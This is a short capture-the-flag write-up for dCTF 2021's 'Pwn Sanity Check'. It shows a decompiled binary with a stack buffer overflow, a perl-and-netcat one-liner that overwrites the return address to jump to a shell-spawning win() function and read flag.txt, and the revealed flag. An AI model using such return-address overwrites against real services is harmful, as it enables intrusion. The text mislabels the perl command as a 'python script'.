Challenge: Pwn Sanity Check
Points: 100
Category: Pwn
Objective: Find the flag on the server with the help of a given file

Process to find the flag: So first of all I opened the given file on Ghidra and saw this.
``
`void vuln(void)
{
  char local_48 [60];
  int local_c;
  puts("tell me a joke");
  fgets(local_48,0x100,stdin);
  if (local_c == -0x21523f22) {
    puts("very good, here is a shell for you. ");
    shell();
  }
  else {
    puts("will this work?");
  }
  return;
}
void shell(void)
{
  puts("spawning /bin/sh process");
  puts("wush!");
  printf("$> ");
  puts("If this is not good enough, you will just have to try harder :)");
  return;
}
void win(int param_1,int param_2)
{
  puts("you made it to win land, no free handouts this time, try harder");
  if (param_1 == -0x21524111) {
    puts("one down, one to go!");
    if (param_2 == 0x1337c0de) {
      puts("2/2 bro good job");
      system("/bin/sh");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  }
  return;```

To solve this we needed a python script, which would skip all the basic parameters and get us the flag.
So this is the python script that we wrote

```python
(perl -e 'print "\xdb\x06\x40\x00\x00\x00\x00\x00"x"32"."\n"';echo "cat flag.txt")|nc dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io 7480
```
So basically the address the computer will go to after the function is right after the area we are reading data into. 
So we just overwrite the address and the data that is being repeated 32 times is the address.
The result of this command is 

![result](https://github.com/thirty2/CTF-Writeups/blob/master/2021/dCTF/pwn/command-result.png "Result")
 
The flag: dctf{Ju5t_m0v3_0n}
